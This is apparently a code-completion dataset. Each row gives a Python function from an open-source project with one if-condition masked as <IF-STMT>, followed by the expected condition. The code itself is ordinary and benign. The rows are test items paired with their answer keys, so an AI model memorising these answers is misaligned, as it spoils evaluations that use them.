1821,"def _get_parameter_scope(param, cmd_list):<tab>if not cmd_list:<tab><tab>return ""N/A (NOT FOUND)""<tab>test_list = cmd_list[0].split("" "")<tab>while len(test_list) > 0:<tab><tab>test_entry = "" "".join(test_list)<tab><tab>all_match = True<tab><tab>for entry in cmd_list[1:]:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>all_match = False<tab><tab><tab><tab>break<tab><tab>if not all_match:<tab><tab><tab>test_list.pop()<tab><tab>else:<tab><tab><tab>return test_entry<tab>return ""_ROOT_""",if test_entry not in entry :,165
1822,"def __call__(self, params):<tab>for param in params:<tab><tab># If we've seen this parameter before, use the previously<tab><tab># constructed optimizer.<tab><tab><IF-STMT><tab><tab><tab>optim = self.optim_objs[param]<tab><tab># If we've never seen this parameter before, construct<tab><tab># an Adam optimizer and keep track of it.<tab><tab>else:<tab><tab><tab>optim = torch.optim.Adam([param], **self.optim_args)<tab><tab><tab>self.optim_objs[param] = optim<tab><tab># Take a gradient step for the parameter param.<tab><tab>optim.step()",if param in self . optim_objs :,151
1823,"def filter_database(db, user, filter_name):<tab>""""""Returns a list of person handles""""""<tab>filt = MatchesFilter([filter_name])<tab>filt.requestprepare(db, user)<tab><IF-STMT><tab><tab>user.begin_progress(<tab><tab><tab>_(""Finding relationship paths""),<tab><tab><tab>_(""Retrieving all sub-filter matches""),<tab><tab><tab>db.get_number_of_people(),<tab><tab>)<tab>matches = []<tab>for handle in db.iter_person_handles():<tab><tab>person = db.get_person_from_handle(handle)<tab><tab>if filt.apply(db, person):<tab><tab><tab>matches.append(handle)<tab><tab>if user:<tab><tab><tab>user.step_progress()<tab>if user:<tab><tab>user.end_progress()<tab>filt.requestreset()<tab>return matches",if user :,198
1824,"def get_independence_days(self, year):<tab>""""""returns a possibly empty list of (date, holiday_name) tuples""""""<tab>days = []<tab>if year > 2004:<tab><tab>actual_date = date(year, 5, 4)<tab><tab>days = [(actual_date, ""Restoration of Independence Day"")]<tab><tab><IF-STMT><tab><tab><tab>days += [<tab><tab><tab><tab>(<tab><tab><tab><tab><tab>self.find_following_working_day(actual_date),<tab><tab><tab><tab><tab>""Restoration of Independence Observed"",<tab><tab><tab><tab>)<tab><tab><tab>]<tab>return days",if actual_date . weekday ( ) in self . get_weekend_days ( ) :,161
1825,"def on_mode_paused(result, mode, *args):<tab>from deluge.ui.console.widgets.popup import PopupsHandler<tab>if isinstance(mode, PopupsHandler):<tab><tab><IF-STMT><tab><tab><tab># If popups are not removed, they are still referenced in the memory<tab><tab><tab># which can cause issues as the popup's screen will not be destroyed.<tab><tab><tab># This can lead to the popup border being visible for short periods<tab><tab><tab># while the current modes' screen is repainted.<tab><tab><tab>log.error(<tab><tab><tab><tab>'Mode ""%s"" still has popups available after being paused.'<tab><tab><tab><tab>"" Ensure all popups are removed on pause!"",<tab><tab><tab><tab>mode.popup.title,<tab><tab><tab>)",if mode . popup is not None :,186
1826,def step(self):<tab>if not self.fully_grown:<tab><tab><IF-STMT><tab><tab><tab># Set as fully grown<tab><tab><tab>self.fully_grown = True<tab><tab><tab>self.countdown = self.model.grass_regrowth_time<tab><tab>else:<tab><tab><tab>self.countdown -= 1,if self . countdown <= 0 :,86
1827,"def getOnlineBuilders(self):<tab>all_workers = yield self.master.data.get((""workers"",))<tab>online_builderids = set()<tab>for worker in all_workers:<tab><tab>connected = worker[""connected_to""]<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>builders = worker[""configured_on""]<tab><tab>builderids = [builder[""builderid""] for builder in builders]<tab><tab>online_builderids.update(builderids)<tab>defer.returnValue(list(online_builderids))",if not connected :,124
1828,"def _latest_major(alternatives):<tab>max_major = -1<tab>for a in alternatives:<tab><tab><IF-STMT><tab><tab><tab>major, _, _, _ = components(a, strict=False)<tab><tab><tab>max_major = max(major, max_major)<tab>return max_major","if is_version_identifier ( a , strict = False ) :",80
1829,"def getVar(self, name):<tab>value = self.tinfoil.run_command(""dataStoreConnectorFindVar"", self.dsindex, name)<tab>overrides = None<tab>if isinstance(value, dict):<tab><tab><IF-STMT><tab><tab><tab>value[""_content""] = self.tinfoil._reconvert_type(<tab><tab><tab><tab>value[""_content""], value[""_connector_origtype""]<tab><tab><tab>)<tab><tab><tab>del value[""_connector_origtype""]<tab><tab>if ""_connector_overrides"" in value:<tab><tab><tab>overrides = value[""_connector_overrides""]<tab><tab><tab>del value[""_connector_overrides""]<tab>return value, overrides","if ""_connector_origtype"" in value :",158
1830,"def initAbbrev(self):<tab>k = self<tab>c = k.c<tab>d = c.config.getAbbrevDict()<tab>if d:<tab><tab>for key in d:<tab><tab><tab>commandName = d.get(key)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>pass  # Must be done later in k.registerCommand.<tab><tab><tab>else:<tab><tab><tab><tab>self.initOneAbbrev(commandName, key)","if commandName . startswith ( ""press-"" ) and commandName . endswith ( ""-button"" ) :",123
1831,def restore_text(self):<tab>if self.source_is_console():<tab><tab>cb = self._last_console_cb<tab>else:<tab><tab>cb = self._last_editor_cb<tab>if cb is None:<tab><tab>if self.is_plain_text_mode():<tab><tab><tab>self.plain_text.clear()<tab><tab>else:<tab><tab><tab>self.rich_text.clear()<tab>else:<tab><tab>func = cb[0]<tab><tab>args = cb[1:]<tab><tab>func(*args)<tab><tab><IF-STMT><tab><tab><tab>self.switch_to_rich_text()<tab><tab>else:<tab><tab><tab>self.switch_to_plain_text(),if get_meth_class_inst ( func ) is self . rich_text :,180
1832,"def get_test_layer():<tab>layers = get_bb_var(""BBLAYERS"").split()<tab>testlayer = None<tab>for l in layers:<tab><tab><IF-STMT><tab><tab><tab>l = os.path.expanduser(l)<tab><tab>if ""/meta-selftest"" in l and os.path.isdir(l):<tab><tab><tab>testlayer = l<tab><tab><tab>break<tab>return testlayer","if ""~"" in l :",98
1833,"def __parse_query(self, model, iter_, data):<tab>f, b = self.__filter, self.__bg_filter<tab>if f is None and b is None:<tab><tab>return True<tab>else:<tab><tab>album = model.get_album(iter_)<tab><tab>if album is None:<tab><tab><tab>return True<tab><tab><IF-STMT><tab><tab><tab>return f(album)<tab><tab>elif f is None:<tab><tab><tab>return b(album)<tab><tab>else:<tab><tab><tab>return b(album) and f(album)",elif b is None :,130
1834,"def iter(iterable, sentinel=None):<tab>if sentinel is None:<tab><tab>i = getattr(iterable, ""__iter__"", None)<tab><tab>if i is not None:<tab><tab><tab>return i()<tab><tab>i = getattr(iterable, ""__getitem__"", None)<tab><tab>if i is not None:<tab><tab><tab>return _iter_getitem(iterable)<tab><tab><IF-STMT><tab><tab><tab>return list(iterable).__iter__()<tab><tab>raise TypeError(""object is not iterable"")<tab>if callable(iterable):<tab><tab>return _iter_callable(iterable, sentinel)<tab>raise TypeError(""iter(v, w): v must be callable"")","if JS ( ""@{{iterable}} instanceof Array"" ) :",153
1835,def run(self):<tab># Prime the coroutine.<tab>next(self.coro)<tab>try:<tab><tab>while True:<tab><tab><tab>with self.abort_lock:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>return<tab><tab><tab># Get the message from the previous stage.<tab><tab><tab>msg = self.in_queue.get()<tab><tab><tab>if msg is POISON:<tab><tab><tab><tab>break<tab><tab><tab>with self.abort_lock:<tab><tab><tab><tab>if self.abort_flag:<tab><tab><tab><tab><tab>return<tab><tab><tab># Send to consumer.<tab><tab><tab>self.coro.send(msg)<tab>except:<tab><tab>self.abort_all(sys.exc_info())<tab><tab>return,if self . abort_flag :,179
1836,"def get_name_from_types(types: Iterable[Union[Type, StrawberryUnion]]):<tab>names = []<tab>for type_ in types:<tab><tab><IF-STMT><tab><tab><tab>return type_.name<tab><tab>elif hasattr(type_, ""_type_definition""):<tab><tab><tab>name = capitalize_first(type_._type_definition.name)<tab><tab>else:<tab><tab><tab>name = capitalize_first(type_.__name__)<tab><tab>names.append(name)<tab>return """".join(names)","if isinstance ( type_ , StrawberryUnion ) :",131
1837,"def _get_user_from_email(group, email):<tab>from sentry.models import User<tab># TODO(dcramer): we should encode the userid in emails so we can avoid this<tab>for user in User.objects.filter(email__iexact=email):<tab><tab># Make sure that the user actually has access to this project<tab><tab>context = access.from_user(user=user, organization=group.organization)<tab><tab><IF-STMT><tab><tab><tab>logger.warning(""User %r does not have access to group %r"", user, group)<tab><tab><tab>continue<tab><tab>return user",if not context . has_team ( group . project . team ) :,149
1838,"def _make_binary_stream(s, encoding):<tab>try:<tab><tab>if _py3k:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>s = s.encode(encoding)<tab><tab>else:<tab><tab><tab>if type(s) is not str:<tab><tab><tab><tab>s = s.encode(encoding)<tab><tab>from io import BytesIO<tab><tab>rv = BytesIO(s)<tab>except ImportError:<tab><tab>rv = StringIO(s)<tab>return rv","if isinstance ( s , str ) :",115
1839,"def error_messages(file_list, files_removed):<tab>if files_removed is None:<tab><tab>return<tab>for remove_this, reason in files_removed:<tab><tab>if file_list is not None:<tab><tab><tab>file_list.remove(remove_this)<tab><tab>if reason == 0:<tab><tab><tab>print("" REMOVED : ("" + str(remove_this) + "")   is not PNG file format"")<tab><tab><IF-STMT><tab><tab><tab>print("" REMOVED : ("" + str(remove_this) + "")   already exists"")<tab><tab>elif reason == 2:<tab><tab><tab>print("" REMOVED : ("" + str(remove_this) + "")   file unreadable"")",elif reason == 1 :,161
1840,"def _eyeAvailable(*args, **kwargs):<tab>try:<tab><tab>r = pylink.getEyeLink().eyeAvailable()<tab><tab><IF-STMT><tab><tab><tab>return EyeTrackerConstants.getName(EyeTrackerConstants.LEFT_EYE)<tab><tab>elif r == 1:<tab><tab><tab>return EyeTrackerConstants.getName(EyeTrackerConstants.RIGHT_EYE)<tab><tab>elif r == 2:<tab><tab><tab>return EyeTrackerConstants.getName(EyeTrackerConstants.BINOCULAR)<tab><tab>else:<tab><tab><tab>return EyeTrackerConstants.UNDEFINED<tab>except Exception as e:<tab><tab>printExceptionDetailsToStdErr()",if r == 0 :,157
1841,"def ignore_callback_errors(self, ignore):<tab>EventEmitter.ignore_callback_errors.fset(self, ignore)<tab>for emitter in self._emitters.values():<tab><tab><IF-STMT><tab><tab><tab>emitter.ignore_callback_errors = ignore<tab><tab>elif isinstance(emitter, EmitterGroup):<tab><tab><tab>emitter.ignore_callback_errors_all(ignore)","if isinstance ( emitter , EventEmitter ) :",95
1842,"def test_empty_condition_node(cond_node):<tab>for node in [cond_node.true_node, cond_node.false_node]:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if type(node) is CodeNode and BaseNode.test_empty_node(node.node):<tab><tab><tab>continue<tab><tab>if BaseNode.test_empty_node(node):<tab><tab><tab>continue<tab><tab>return False<tab>return True",if node is None :,108
1843,"def _confirm_deps(self, trans):<tab>if [pkgs for pkgs in trans.dependencies if pkgs]:<tab><tab>dia = AptConfirmDialog(trans, parent=self.parent)<tab><tab>res = dia.run()<tab><tab>dia.hide()<tab><tab><IF-STMT><tab><tab><tab>log.debug(""Response is: %s"" % res)<tab><tab><tab>if self.finish_handler:<tab><tab><tab><tab>log.debug(""Finish_handler..."")<tab><tab><tab><tab>self.finish_handler(trans, 0, self.data)<tab><tab><tab>return<tab>self._run_transaction(trans)",if res != Gtk . ResponseType . OK :,147
1844,"def get_human_type(self, translate=True):<tab>""""""Returns prettified name of the object type""""""<tab>try:<tab><tab>obj_name = re.match("".*\.(?P<name>\w+)$"", self.object_type).group(""name"")<tab><tab>pattern = re.compile(""([A-Z][A-Z][a-z])|([a-z][A-Z])"")<tab><tab>human_type = pattern.sub(<tab><tab><tab>lambda m: m.group()[:1] + "" "" + m.group()[1:], obj_name<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>human_type = _(human_type)<tab><tab>return human_type<tab>except Exception:<tab><tab>return self.object_type",if translate :,174
1845,"def ascii85decode(data):<tab>n = b = 0<tab>out = """"<tab>for c in data:<tab><tab>if ""!"" <= c and c <= ""u"":<tab><tab><tab>n += 1<tab><tab><tab>b = b * 85 + (ord(c) - 33)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>out += struct.pack("">L"", b)<tab><tab><tab><tab>n = b = 0<tab><tab>elif c == ""z"":<tab><tab><tab>assert n == 0<tab><tab><tab>out += ""\0\0\0\0""<tab><tab>elif c == ""~"":<tab><tab><tab>if n:<tab><tab><tab><tab>for _ in range(5 - n):<tab><tab><tab><tab><tab>b = b * 85 + 84<tab><tab><tab><tab>out += struct.pack("">L"", b)[: n - 1]<tab><tab><tab>break<tab>return out",if n == 5 :,200
1846,"def calculateModifiedAttributes(self, fit, runTime, forceProjected=False):<tab>if self.item:<tab><tab>for effect in self.item.effects.values():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>effect.handler(fit, self, (""module"",), None, effect=effect)",if effect . runTime == runTime and effect . activeByDefault :,81
1847,"def loadHandler(self, human, values, strict):<tab>if values[0] == ""pose"":<tab><tab>poseFile = values[1]<tab><tab>poseFile = getpath.thoroughFindFile(poseFile, self.paths)<tab><tab>if not os.path.isfile(poseFile):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise RuntimeError(<tab><tab><tab><tab><tab>""Could not load pose %s, file does not exist."" % poseFile<tab><tab><tab><tab>)<tab><tab><tab>log.warning(""Could not load pose %s, file does not exist."", poseFile)<tab><tab>else:<tab><tab><tab>self.loadPose(poseFile)<tab><tab>return",if strict :,156
1848,"def get_outdated_docs(self) -> Iterator[str]:<tab>for docname in self.env.found_docs:<tab><tab><IF-STMT><tab><tab><tab>yield docname<tab><tab><tab>continue<tab><tab>targetname = path.join(self.outdir, docname + self.out_suffix)<tab><tab>try:<tab><tab><tab>targetmtime = path.getmtime(targetname)<tab><tab>except Exception:<tab><tab><tab>targetmtime = 0<tab><tab>try:<tab><tab><tab>srcmtime = path.getmtime(self.env.doc2path(docname))<tab><tab><tab>if srcmtime > targetmtime:<tab><tab><tab><tab>yield docname<tab><tab>except OSError:<tab><tab><tab># source doesn't exist anymore<tab><tab><tab>pass",if docname not in self . env . all_docs :,176
1849,"def __init__(self, items=()):<tab>_dictEntries = []<tab>for name, value in items:<tab><tab><IF-STMT><tab><tab><tab>for item in name:<tab><tab><tab><tab>_dictEntries.append((item, value))<tab><tab>else:<tab><tab><tab>_dictEntries.append((name, value))<tab>dict.__init__(self, _dictEntries)<tab>assert len(self) == len(_dictEntries)<tab>self.default = None","if isinstance ( name , ( list , tuple , frozenset , set ) ) :",117
1850,"def ping_task():<tab>try:<tab><tab>if self._protocol.peer_manager.peer_is_good(peer):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._protocol.add_peer(peer)<tab><tab><tab>return<tab><tab>await self._protocol.get_rpc_peer(peer).ping()<tab>except (asyncio.TimeoutError, RemoteException):<tab><tab>pass",if peer not in self . _protocol . routing_table . get_peers ( ) :,106
1851,def get_resolved_dependencies(self):<tab>dependencies = []<tab>for dependency in self.envconfig.deps:<tab><tab>if dependency.indexserver is None:<tab><tab><tab>package = resolve_package(package_spec=dependency.name)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>dependency = dependency.__class__(package)<tab><tab>dependencies.append(dependency)<tab>return dependencies,if package != dependency . name :,93
1852,"def main(msg: func.QueueMessage, dashboard: func.Out[str]) -> None:<tab>body = msg.get_body()<tab>logging.info(""heartbeat: %s"", body)<tab>raw = json.loads(body)<tab>try:<tab><tab>entry = TaskHeartbeatEntry.parse_obj(raw)<tab><tab>task = Task.get_by_task_id(entry.task_id)<tab><tab><IF-STMT><tab><tab><tab>logging.error(task)<tab><tab><tab>return<tab><tab>if task:<tab><tab><tab>task.heartbeat = datetime.utcnow()<tab><tab><tab>task.save()<tab>except ValidationError:<tab><tab>logging.error(""invalid task heartbeat: %s"", raw)<tab>events = get_events()<tab>if events:<tab><tab>dashboard.set(events)","if isinstance ( task , Error ) :",189
1853,"def testTlsServerServeForeverTwice(self):<tab>""""""Call on serve_forever() twice should result in a runtime error""""""<tab>with patch.object(ssl.SSLContext, ""load_cert_chain"") as mock_method:<tab><tab>server = yield from StartTlsServer(<tab><tab><tab>context=self.context, address=(""127.0.0.1"", 0), loop=self.loop<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>server_task = asyncio.create_task(server.serve_forever())<tab><tab>else:<tab><tab><tab>server_task = asyncio.ensure_future(server.serve_forever())<tab><tab>yield from server.serving<tab><tab>with self.assertRaises(RuntimeError):<tab><tab><tab>yield from server.serve_forever()<tab><tab>server.server_close()","if PYTHON_VERSION >= ( 3 , 7 ) :",195
1854,"def getInstances_WithSource(self, instancesAmount, sourceObject, scenes):<tab>if sourceObject is None:<tab><tab>self.removeAllObjects()<tab><tab>return []<tab>else:<tab><tab>sourceHash = hash(sourceObject)<tab><tab>if self.identifier in lastSourceHashes:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.removeAllObjects()<tab><tab>lastSourceHashes[self.identifier] = sourceHash<tab>return self.getInstances_Base(instancesAmount, sourceObject, scenes)",if lastSourceHashes [ self . identifier ] != sourceHash :,132
1855,"def get_row(self, binary=False, columns=None, raw=None, prep_stmt=None):<tab>""""""Get the next rows returned by the MySQL server""""""<tab>try:<tab><tab>rows, eof = self.get_rows(<tab><tab><tab>count=1, binary=binary, columns=columns, raw=raw, prep_stmt=prep_stmt<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>return (rows[0], eof)<tab><tab>return (None, eof)<tab>except IndexError:<tab><tab># No row available<tab><tab>return (None, None)",if rows :,135
1856,"def try_adjust_widgets(self):<tab>if hasattr(self.parent, ""adjust_widgets""):<tab><tab>self.parent.adjust_widgets()<tab>if hasattr(self.parent, ""parentApp""):<tab><tab>if hasattr(self.parent.parentApp, ""_internal_adjust_widgets""):<tab><tab><tab>self.parent.parentApp._internal_adjust_widgets()<tab><tab><IF-STMT><tab><tab><tab>self.parent.parentApp.adjust_widgets()","if hasattr ( self . parent . parentApp , ""adjust_widgets"" ) :",118
1857,"def parseStatementList():<tab>list__py__ = []<tab>statement = None<tab>while index < length:<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>statement = parseSourceElement()<tab><tab>if (<tab><tab><tab>""undefined"" if not ""statement"" in locals() else typeof(statement)<tab><tab>) == ""undefined"":<tab><tab><tab>break<tab><tab>list__py__.append(statement)<tab>return list__py__","if match ( ""}"" ) :",103
1858,"def forward(self, Z):<tab>losses = []<tab>context = self.context_cnn(Z)<tab>targets = self.target_cnn(Z)<tab>_, _, h, w = Z.shape<tab># future prediction<tab>preds = self.pred_cnn(context)<tab>for steps_to_ignore in range(h - 1):<tab><tab>for i in range(steps_to_ignore + 1, h):<tab><tab><tab>loss = self.compute_loss_h(targets, preds, i)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>losses.append(loss)<tab>loss = torch.stack(losses).sum()<tab>return loss",if not torch . isnan ( loss ) :,157
1859,"def __run(self, command):<tab>sys.stdout, self.stdout = self.stdout, sys.stdout<tab>sys.stderr, self.stderr = self.stderr, sys.stderr<tab>try:<tab><tab>try:<tab><tab><tab>r = eval(command, self.namespace, self.namespace)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>print_(repr(r))<tab><tab>except SyntaxError:<tab><tab><tab>exec(command, self.namespace)<tab>except:<tab><tab>if hasattr(sys, ""last_type"") and sys.last_type == SystemExit:<tab><tab><tab>self.destroy()<tab><tab>else:<tab><tab><tab>traceback.print_exc()<tab>sys.stdout, self.stdout = self.stdout, sys.stdout<tab>sys.stderr, self.stderr = self.stderr, sys.stderr",if r is not None :,192
1860,"def prune(self):<tab>file = self.file<tab>if self.remain == 0:<tab><tab>read_pos = file.tell()<tab><tab>file.seek(0, 2)<tab><tab>sz = file.tell()<tab><tab>file.seek(read_pos)<tab><tab>if sz == 0:<tab><tab><tab># Nothing to prune.<tab><tab><tab>return<tab>nf = self.newfile()<tab>while True:<tab><tab>data = file.read(COPY_BYTES)<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>nf.write(data)<tab>self.file = nf",if not data :,141
1861,"def reduce_inode(self, f, init):<tab>for x in range(0, len(self._array), 2):<tab><tab>key_or_none = self._array[x]<tab><tab>val_or_node = self._array[x + 1]<tab><tab><IF-STMT><tab><tab><tab>init = val_or_node.reduce_inode(f, init)<tab><tab>else:<tab><tab><tab>init = f.invoke([init, rt.map_entry(key_or_none, val_or_node)])<tab><tab>if rt.reduced_QMARK_(init):<tab><tab><tab>return init<tab>return init",if key_or_none is None and val_or_node is not None :,160
1862,"def gen_topython_helper(cw):<tab>cw.enter_block(<tab><tab>""private static BaseException/*!*/ ToPythonHelper(System.Exception clrException)""<tab>)<tab>allExceps = get_all_exceps([], exceptionHierarchy)<tab>allExceps.sort(cmp=compare_exceptions)<tab>for x in allExceps:<tab><tab><IF-STMT><tab><tab><tab>cw.writeline(""#if !SILVERLIGHT"")<tab><tab>cw.writeline(<tab><tab><tab>""if (clrException is %s) return %s;""<tab><tab><tab>% (x.ExceptionMappingName, x.MakeNewException())<tab><tab>)<tab><tab>if not x.silverlightSupported:<tab><tab><tab>cw.writeline(""#endif"")<tab>cw.writeline(""return new BaseException(Exception);"")<tab>cw.exit_block()",if not x . silverlightSupported :,200
1863,"def file_versions(self, path):<tab>""""""Returns all commits where given file was modified""""""<tab>versions = []<tab>commits_info = self.commit_info()<tab>seen_shas = set()<tab>for commit in commits_info:<tab><tab>try:<tab><tab><tab>files = self.get_commit_files(commit[""sha""], paths=[path])<tab><tab><tab>file_path, file_data = files.items()[0]<tab><tab>except IndexError:<tab><tab><tab>continue<tab><tab>file_sha = file_data[""sha""]<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>else:<tab><tab><tab>seen_shas.add(file_sha)<tab><tab># Add file info<tab><tab>commit[""file""] = file_data<tab><tab>versions.append(file_data)<tab>return versions",if file_sha in seen_shas :,194
1864,"def _append_fragment(self, ctx, frag_content):<tab>try:<tab><tab>ctx[""dest_stream""].write(frag_content)<tab><tab>ctx[""dest_stream""].flush()<tab>finally:<tab><tab><IF-STMT><tab><tab><tab>self._write_ytdl_file(ctx)<tab><tab>if not self.params.get(""keep_fragments"", False):<tab><tab><tab>os.remove(encodeFilename(ctx[""fragment_filename_sanitized""]))<tab><tab>del ctx[""fragment_filename_sanitized""]",if self . __do_ytdl_file ( ctx ) :,128
1865,"def gen_segs(glyph):<tab>bzs = glyph_to_bzs(glyph)<tab>for sp in bzs:<tab><tab>bks = segment_sp(sp)<tab><tab>for i in range(len(bks)):<tab><tab><tab>bk0, bk1 = bks[i], bks[(i + 1) % len(bks)]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>segstr = seg_to_string(sp, bk0, bk1)<tab><tab><tab><tab>fn = seg_fn(segstr)<tab><tab><tab><tab>file(fn, ""w"").write(segstr)",if bk1 != ( bk0 + 1 ) % len ( sp ) or len ( sp [ bk0 ] ) != 2 :,166
1866,"def matches(self, filepath):<tab>matched = False<tab>parent_path = os.path.dirname(filepath)<tab>parent_path_dirs = split_path(parent_path)<tab>for pattern in self.patterns:<tab><tab>negative = pattern.exclusion<tab><tab>match = pattern.match(filepath)<tab><tab>if not match and parent_path != """":<tab><tab><tab><IF-STMT><tab><tab><tab><tab>match = pattern.match(<tab><tab><tab><tab><tab>os.path.sep.join(parent_path_dirs[: len(pattern.dirs)])<tab><tab><tab><tab>)<tab><tab>if match:<tab><tab><tab>matched = not negative<tab>return matched",if len ( pattern . dirs ) <= len ( parent_path_dirs ) :,165
1867,"def __repr__(self):<tab>text = ""{}("".format(self.__class__.__name__)<tab>n = len(self)<tab>for i in range(n):<tab><tab><IF-STMT><tab><tab><tab>if i > 0:<tab><tab><tab><tab>text = text + "", ""<tab><tab><tab>text = text + ""{}={}"".format(fields[i], str(self[i]))<tab>text = text + "")""<tab>return text",if self [ i ] != None :,102
1868,"def difference_matrix(samples, debug=True):<tab>""""""Calculate the difference matrix for the given set of samples.""""""<tab>diff_matrix = {}<tab>for x in samples:<tab><tab>if debug:<tab><tab><tab>print(""Calculating difference matrix for %s"" % x)<tab><tab><IF-STMT><tab><tab><tab>diff_matrix[x] = {}<tab><tab>for y in samples:<tab><tab><tab>if samples[x] != samples[y]:<tab><tab><tab><tab>d = difference(samples[x], samples[y])<tab><tab><tab><tab># print(""Difference between %s and %s: %d"" % (x, y, d))<tab><tab><tab><tab>diff_matrix[x][y] = d<tab><tab><tab>else:<tab><tab><tab><tab>diff_matrix[x][y] = 0<tab>return diff_matrix",if x not in diff_matrix :,196
1869,"def load_config(self):<tab>try:<tab><tab>with open(CONFIG_PATH) as f:<tab><tab><tab>y = yaml.safe_load(f)<tab><tab>for key, value in y.items():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>setattr(self, key.upper(), value)<tab>except IOError:<tab><tab>logger.warning(<tab><tab><tab>f""No config file found at {CONFIG_PATH}, using defaults.\n""<tab><tab><tab>f""Set the CONFIG_PATH environment variable to point to a config file to override.""<tab><tab>)","if hasattr ( self , key . upper ( ) ) and not os . getenv ( key . upper ( ) ) :",148
1870,"def checkout_branch(self, branch):<tab>if branch in self.remote_branches:<tab><tab>sickrage.app.log.debug(<tab><tab><tab>""Branch checkout: "" + self._find_installed_version() + ""->"" + branch<tab><tab>)<tab><tab>if not self.install_requirements(self.current_branch):<tab><tab><tab>return False<tab><tab># remove untracked files and performs a hard reset on git branch to avoid update issues<tab><tab><IF-STMT><tab><tab><tab>self.reset()<tab><tab># fetch all branches<tab><tab>self.fetch()<tab><tab>__, __, exit_status = self._git_cmd(self._git_path, ""checkout -f "" + branch)<tab><tab>if exit_status == 0:<tab><tab><tab>return True<tab>return False",if sickrage . app . config . git_reset :,194
1871,"def upload(<tab>youtube_resource, video_path, body, chunksize=1024 * 1024, progress_callback=None):<tab>body_keys = "","".join(body.keys())<tab>media = MediaFileUpload(video_path, chunksize=chunksize, resumable=True)<tab>videos = youtube_resource.videos()<tab>request = videos.insert(part=body_keys, body=body, media_body=media)<tab>while 1:<tab><tab>status, response = request.next_chunk()<tab><tab>if response:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return response[""id""]<tab><tab><tab>else:<tab><tab><tab><tab>raise KeyError(""Response has no 'id' field"")<tab><tab>elif status and progress_callback:<tab><tab><tab>progress_callback(status.total_size, status.resumable_progress)","if ""id"" in response :",197
1872,def execute(self):<tab>with self._guard_sigpipe():<tab><tab>try:<tab><tab><tab>targets = (<tab><tab><tab><tab>self.get_targets()<tab><tab><tab><tab>if self.act_transitively<tab><tab><tab><tab>else self.context.target_roots<tab><tab><tab>)<tab><tab><tab>for value in self.console_output(targets) or tuple():<tab><tab><tab><tab>self._outstream.write(value.encode())<tab><tab><tab><tab>self._outstream.write(self._console_separator.encode())<tab><tab>finally:<tab><tab><tab>self._outstream.flush()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._outstream.close(),if self . get_options ( ) . output_file :,162
1873,"def declare_var(<tab>self,<tab>type_name: Union[str, Tuple[str, str]],<tab>*,<tab>var_name: str = """",<tab>var_name_prefix: str = ""v"",<tab>shared: bool = False,) -> str:<tab>if shared:<tab><tab>if not var_name:<tab><tab><tab>var_name = var_name_prefix<tab><tab><IF-STMT><tab><tab><tab>self.declarations.append((var_name, type_name))<tab><tab><tab>self.shared_vars.add(var_name)<tab>else:<tab><tab>if not var_name:<tab><tab><tab>var_name = self.get_var_name(var_name_prefix)<tab><tab>self.declarations.append((var_name, type_name))<tab>return var_name",if var_name not in self . shared_vars :,197
1874,"def parse_counter_style_name(tokens, counter_style):<tab>tokens = remove_whitespace(tokens)<tab>if len(tokens) == 1:<tab><tab>(token,) = tokens<tab><tab>if token.type == ""ident"":<tab><tab><tab>if token.lower_value in (""decimal"", ""disc""):<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>return token.value<tab><tab><tab>elif token.lower_value != ""none"":<tab><tab><tab><tab>return token.value",if token . lower_value not in counter_style :,122
1875,"def __init__(self, appName=""""):<tab>dlgappcore.AppDialog.__init__(self, win32ui.IDD_GENERAL_STATUS)<tab>self.timerAppName = appName<tab>self.argOff = 0<tab>if len(self.timerAppName) == 0:<tab><tab><IF-STMT><tab><tab><tab>self.timerAppName = sys.argv[1]<tab><tab><tab>self.argOff = 1","if len ( sys . argv ) > 1 and sys . argv [ 1 ] [ 0 ] != ""/"" :",116
1876,"def tearDownClass(cls):<tab>for conn in settings.HAYSTACK_CONNECTIONS.values():<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if ""STORAGE"" in conn and conn[""STORAGE""] != ""file"":<tab><tab><tab>continue<tab><tab># Start clean<tab><tab>if os.path.exists(conn[""PATH""]):<tab><tab><tab>shutil.rmtree(conn[""PATH""])<tab>super(WhooshTestCase, cls).tearDownClass()","if conn [ ""ENGINE"" ] != ""haystack.backends.whoosh_backend.WhooshEngine"" :",118
1877,"def forward(self, x):<tab>if self.ffn_type in (1, 2):<tab><tab>x0 = self.wx0(x)<tab><tab>if self.ffn_type == 1:<tab><tab><tab>x1 = x<tab><tab><IF-STMT><tab><tab><tab>x1 = self.wx1(x)<tab><tab>out = self.output(x0 * x1)<tab>out = self.dropout(out)<tab>out = self.LayerNorm(out + x)<tab>return out",elif self . ffn_type == 2 :,122
1878,"def __call__(self, data, **params):<tab>p = param.ParamOverrides(self, params)<tab>if isinstance(data, (HoloMap, NdOverlay)):<tab><tab>ranges = {d.name: data.range(d) for d in data.dimensions()}<tab><tab>data = data.clone(<tab><tab><tab>{k: GridMatrix(self._process(p, v, ranges)) for k, v in data.items()}<tab><tab>)<tab><tab>data = Collator(data, merge_type=type(data))()<tab><tab><IF-STMT><tab><tab><tab>data = data.map(lambda x: x.overlay(p.overlay_dims), (HoloMap,))<tab><tab>return data<tab>elif isinstance(data, Element):<tab><tab>data = self._process(p, data)<tab><tab>return GridMatrix(data)",if p . overlay_dims :,200
